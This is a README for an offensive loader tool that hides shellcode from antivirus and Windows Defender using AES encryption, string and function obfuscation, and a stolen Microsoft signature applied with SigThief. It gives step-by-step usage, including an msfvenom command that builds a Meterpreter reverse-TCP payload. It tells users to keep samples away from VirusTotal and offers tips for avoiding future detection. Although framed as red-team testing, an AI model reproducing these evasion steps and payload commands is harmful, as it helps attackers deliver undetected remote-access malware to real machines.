![Screen Shot 2022-10-02 at 10 29 43 AM](https://user-images.githubusercontent.com/76174163/193459711-647f63a7-b7e6-49b6-9659-f63cebdbeece.png)


**Meet Harriet!**

Harriet was inspired by the Charlotte C++ shellcode loader. This tool uses AES encryption and function/variable obfuscation to get around AV and Windows Defender. Most of the code was taken from the Sektor 7 Malware Development Essentials course. All credit goes to reenz0h and @Sektor7net. I wrote this mainly as a way to get a quick undetected executable for testing and to not have to switch over to a Windows VM every five seconds for compiling. 

![Screen Shot 2022-10-17 at 12 14 33 PM](https://user-images.githubusercontent.com/76174163/196229183-c96e9a38-8466-4ebd-81ab-35934877d559.png)

The payload framework is very effective when paired with my Covenant Randomizer script.

![Screen Shot 2022-10-17 at 12 15 10 PM](https://user-images.githubusercontent.com/76174163/196229270-49bb9d83-a18d-4cb6-b1b7-b798fca19d4c.png)

I was able to bypass Defender with Covenant with no problems.

![Screen Shot 2022-10-17 at 11 59 31 AM](https://user-images.githubusercontent.com/76174163/196239034-54866187-c461-4735-be81-9821c3a1e9a0.png)

I was also able to bypass Defender with a Meterpreter payload. This might not be as effective since Meterpreter is signatured so heavily. Your results will vary without modifying your Meterpreter payload's template inside Metasploit. Going with lesser used payloads will probably yield good results. 

**Modules**

![Screen Shot 2022-10-17 at 12 12 15 PM](https://user-images.githubusercontent.com/76174163/196239966-8d41b19b-6d66-4a80-a72c-4d1554197702.png)

There are four modules currently. As of this post, all of them bypass AV/Defender. 
 
AES Encrypted payload
AES Encrypted payload with process injection
QueueUserAPC shellcode execution
ThreadPoolWait shellcode execution. 

All of the modules use XOR encryption for strings and function obfuscation and AES encryption for payload exection. Once the payload is compiled, the script uses SigThief to sign the binary with a Microsoft certificate. 

**Usage:** 

Clone The Repo

**git clone https://github.com/assume-breach/Home-Grown-Red-Team.git**

Run The Setup Script

**cd Home-Grown-Red-Team/Harriet/
bash setup.sh**

Create Your Payload

**msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=IP lport=PORT -f raw > msfr.bin**

Run the Script

**bash Harriet.sh **

Fill In The Values As Prompted

**Enjoy and DON'T UPLOAD TO Virus Total!!!!!**

**Mitigations**

There are a few issues that you should be aware of. The first is that this will be detected at some point. Eventually, it will wind up on VT or the AV engines will signature it. There are mitigations that you can take to customize it. The first is to change the Virt_Alloc variable in all of the scripts. The second is to change all of the values in the perl scripts. Adding various sleep functions within the scripts can also keep the script from being signatured. 
